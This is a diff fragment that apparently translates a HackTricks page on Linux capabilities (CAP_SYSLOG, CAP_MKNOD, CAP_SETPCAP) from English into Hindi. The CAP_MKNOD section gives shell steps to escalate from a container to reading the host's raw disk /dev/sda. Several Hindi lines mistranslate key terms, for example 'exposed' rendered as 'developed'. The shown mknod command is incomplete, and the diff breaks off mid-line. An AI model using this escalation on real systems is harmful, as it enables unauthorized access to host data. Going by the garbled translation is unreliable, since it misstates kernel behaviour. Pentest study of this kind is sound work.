+यह क्षमता यह भी संभव करती है कि `kexec_load(2)` सिस्टम कॉल का उपयोग किया जाए, जो एक नया क्रैश कर्नल लोड करता है और Linux 3.17 के रूप में, `kexec_file_load(2)` भी लोड करेगा जो साइन कर्नल लोड करेगा।
 
 ## CAP\_SYSLOG
 
-[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) was finally forked in Linux 2.6.37 from the `CAP_SYS_ADMIN` catchall, this capability allows the process to use the `syslog(2)` system call. This also allows the process to view kernel addresses exposed via `/proc` and other interfaces when `/proc/sys/kernel/kptr_restrict` is set to 1.
+[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) अंत में Linux 2.6.37 में `CAP_SYS_ADMIN` कैचॉल से फोर्क किया गया था, यह क्षमता प्रक्रिया को `syslog(2)` सिस्टम कॉल का उपयोग करने की अनुमति देती है। यह भी प्रक्रिया को `/proc/sys/kernel/kptr_restrict` 1 पर सेट होने पर `/proc` और अन्य इंटरफेस के माध्यम से विकसित कर्नल पतों को देखने की अनुमति देती है।
 
-The `kptr_restrict` sysctl setting was introduced in 2.6.38, and determines if kernel addresses are exposed. This defaults to zero (exposing kernel addresses) since 2.6.39 within the vanilla kernel, although many distributions correctly set the value to 1 (hide from everyone accept uid 0) or 2 (always hide).
+`kptr_restrict` सिस्कटल सेटिंग 2.6.38 में पेश किया गया था, और यह निर्धारित करता है कि कर्नल पते विकसित होते हैं या नहीं। यह 2.6.39 के बाद से डिफ़ॉल्ट रूप से शून्य (कर्नल पते विकसित करना) होता है, हालांकि कई वितरण सही मान सेट करते हैं 1 (सभी को छिपाएं केवल uid 0 को छोड़कर) या 2 (हमेशा छिपाएं)।
 
-In addition, this capability also allows the process to view `dmesg` output, if the `dmesg_restrict` setting is 1. Finally, the `CAP_SYS_ADMIN` capability is still permitted to perform `syslog` operations itself for historical reasons.
+इसके अलावा, यह क्षमता भी प्रक्रिया को `dmesg` आउटपुट देखने की अनुमति देती है, यदि `dmesg_restrict` सेटिंग 1 होती है। अंत में, `CAP_SYS_ADMIN` क्षमता अभी भी ऐतिहासिक कारणों से `syslog` कार्यों को करने की अनुमति देती है।
 
 ## CAP\_MKNOD
 
-[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows an extended usage of [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) by permitting creation of something other than a regular file (`S_IFREG`), FIFO (named pipe)(`S_IFIFO`), or UNIX domain socket (`S_IFSOCK`). The special files are:
+[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) का विस्तारित उपयोग करने की अनुमति देता है जिसके द्वारा नियमित फ़ाइल (`S_IFREG`), FIFO (नामित पाइप) (`S_IFIFO`), या UNIX डोमेन सॉकेट (`S_IFSOCK`) के अलावा कुछ और बनाने की अनुमति देता है। विशेष फ़ाइलें हैं:
 
-* `S_IFCHR` (Character special file (a device like a terminal))
-* `S_IFBLK` (Block special file (a device like a disk)).
+* `S_IFCHR` (वर्ण स्पेशल फ़ाइल (टर्मिनल जैसी उपकरण))
+* `S_IFBLK` (ब्लॉक स्पेशल फ़ाइल (डिस्क जैसी उपकरण))।
 
-It is a default capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
+यह एक डिफ़ॉल्ट क्षमता है ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))।
 
-This capability permits to do privilege escalations (through full disk read) on the host, under these conditions:
+इस क्षमता के तहत, निम्नलिखित शर्तों के तहत होस्ट पर प्रिविलेज इस्केलेशन (पूरे डिस्क पढ़ने के माध्यम से) किया जा सकता है:
 
-1. Have initial access to the host (Unprivileged).
-2. Have initial access to the container (Privileged (EUID 0), and effective `CAP_MKNOD`).
-3. Host and container should share the same user namespace.
+1. होस्ट पर प्रारंभिक पहुंच होनी चाहिए (अनुप्रयोगी)।
+2. कंटेनर पर प्रारंभिक पहुंच होनी चाहिए (विशेषाधिकारी (EUID 0), और प्रभावी `CAP_MKNOD`)।
+3. होस्ट और कंटेनर को एक ही उपयोगकर्ता नेमस्पेस साझा करना चाहिए।
 
-**Steps :**
+**चरण :**
 
-1. On the host, as a standard user:
-   1. Get the current UID (`id`). For example: `uid=1000(unprivileged)`.
-   2. Get the device you want to read. For exemple: `/dev/sda`
-2. On the container, as `root`:
-
+1. होस्ट पर, एक मानक उपयोगकर्ता के रूप में:
+1. वर्तमान UID प्राप्त करें (`id`)। उदाहरण के लिए: `uid=1000(unprivileged)`।
+2. आप जिस डिवाइस को पढ़ना चाहते हैं, उसे प्राप्त करें। उदाहरण के लिए: `/dev/sda`
+2. कंटेनर पर, `रूट` के रूप में:
 ```bash
 # Create a new block special file matching the host device
 mknod /dev/sda b
@@ -1649,9 +2030,7 @@ useradd -u 1000 unprivileged
 # Login with that user
 su unprivileged
 ```
-
-1. Back on the host:
-
+1. मेजबान पर वापस:
 ```bash
 # Find the PID linked to the container owns by the user "unprivileged"
 # Example only (Depends on the shell program, etc.). Here: PID=18802.
@@ -1663,26 +2042,25 @@ unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin
 # Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
 head /proc/18802/root/dev/sda
 ```
-
-The attacker can now read, dump, copy the device /dev/sda from unprivileged user.
+हमलावर अब अनधिकृत उपयोगकर्ता से उपकरण /dev/sda को पढ़, डंप और कॉपी कर सकते हैं।
 
 ### CAP\_SETPCAP
 
-**`CAP_SETPCAP`** is a Linux capability that allows a process to **modify the capability sets of another process**. It grants the ability to add or remove capabilities from the effective, inheritable, and permitted capability sets of other processes. However, there are certain restrictions on how this capability can be used.
+**`CAP_SETPCAP`** एक Linux क्षमता है जो एक प्रक्रिया को दूसरी प्रक्रिया की क्षमता सेट को संशोधित करने की अनुमति देती है। यह अन्य प्रक्रियाओं की प्रभावी, विरासत और अनुमत क्षमता सेट में क्षमताओं को जोड़ने या हटाने की क्षमता प्रदान करती है। हालांकि, इस क्षमता का उपयोग कैसे किया जा सकता है, इसमें कुछ प्रतिबंध हैं।
 
-A process with `CAP_SETPCAP` **can only grant or remove capabilities that are in its own permitted capability set**. In other words, a process cannot grant a capability to another process if it does not have that capability itself. This restriction prevents a process from elevating the privileges of another process beyond its own level of privilege.
+`CAP_SETPCAP` वाली प्रक्रिया **केवल उन्हीं क्षमताओं को प्रदान या हटा सकती है जो उसकी अनुमत क्षमता सेट में हैं**। अन्य शब्दों में, एक प्रक्रिया उस क्षमता को दूसरी प्रक्रिया को प्रदान नहीं कर सकती है जिसकी वह खुद की क्षमता नहीं है। यह प्रतिबंध एक प्रक्रिया को अपने स्वयं के विशेषाधिकार से बाहर दूसरी प्रक्रिया की प्रिविलेज को बढ़ाने से रोकता है।
 
-Moreover, in recent kernel versions, the `CAP_SETPCAP` capability has been **further restricted**. It no longer allows a process to arbitrarily modify the capability sets of other processes. Instead, it **only allows a process to lower the capabilities in its own permitted capability set or the permitted capability set of its descendants**. This change was introduced to reduce potential security risks associated with the capability.
+इसके अलावा, हाल के कर्नल संस्करणों में, `CAP_SETPCAP` क्षमता को **और अधिक प्रतिबंधित किया गया है**। अब यह प्रक्रिया को अन्य प्रक्रियाओं की क्षमता सेट को अनियमित रूप से संशोधित करने की अनुमति नहीं देता है। इसकी बजाय, यह केवल एक प्रक्रिया को अपनी अनुमत क्षमता सेट या अपने वंशजों की अनुमत क्षमता सेट में क्षमताओं को कम करने की अनुमति देता है। इस परिवर्तन को क्षमता के साथ संबंधित संभावित सुरक्षा जोखिमों को कम करने के लिए लागू किया गया था।
 
-To use `CAP_SETPCAP` effectively, you need to have the capability in your effective capability set and the target capabilities in your permitted capability set. You can then use the `capset()` system call to modify the capability sets of other processes.
+`CAP_SETPCAP` को सक्रिय रूप से उपयोग करने के लिए, आपको अपनी प्रभावी क्षमता सेट में क्षमता होनी चाहिए और लक्षित क्षमताएं अपनी अनुमत क्षमता सेट में होनी चाहिए। फिर आप `capset()` सिस्टम कॉल का उपयोग करके अन्य प्रक्रियाओं की क्षमता सेट को संशोधित कर सकते हैं।
 
-In summary, `CAP_SETPCAP` allows a process to modify the capability sets of other processes, but it cannot grant capabilities that it doesn't have itself. Additionally, due to security concerns, its functionality has been limited in recent kernel versions to only allow reducing capabilities in its own permitted capability set or the permitted capability sets of its descendants.
+सारांश में, `CAP_SETPCAP` एक प्रक्रिया को अन्य प्रक्रियाओं की क्षमता सेट को संशोधित करने की अनुमति देती है, लेकिन यह उन क्षमताओं को प्रदान नहीं कर सकती है जिनकी वह खुद के पास नहीं है। इसके अलावा, सुरक्षा संबंधी चिंताओं के कारण, हाल के कर्नल संस्करणों में इसकी क्षमता को केवल अपनी अनुमत क्षमता सेट या अपने वंशजों की अनुमत क्षमता सेट में क्षमताओं को कम करने की अनुमति है।
 
-## References
+## संदर्भ
 
-**Most of these examples were taken from some labs of** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), so if you want to practice this privesc techniques I recommend these labs.
+**इन उदाहरणों का अधिकांश** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **के कुछ प्रयोगशालाओं से लिए गए हैं**, इसलिए यदि आप इन प्रिवेस्क तकनीकों का अभ्यास करना चाहते हैं तो मैं इन प्रयोगशालाओं की सिफारिश करता हूं।
 
-**Other references**:
+**अन्य संदर्भ**:
 
 * [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
 * [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
@@ -1695,18 +2073,10 @@ In summary, `CAP_SETPCAP` allows a process to modify the capability sets of othe
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
+[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे महत्वपूर्ण साइबर सुरक्षा घटना है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** के मिशन के साथ, यह कांग्रेस हर विषय में टेक्नोलॉजी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थल है।
 
 {% embed url="https://www.rootedcon.com/" %}
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
-
-</details>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hack
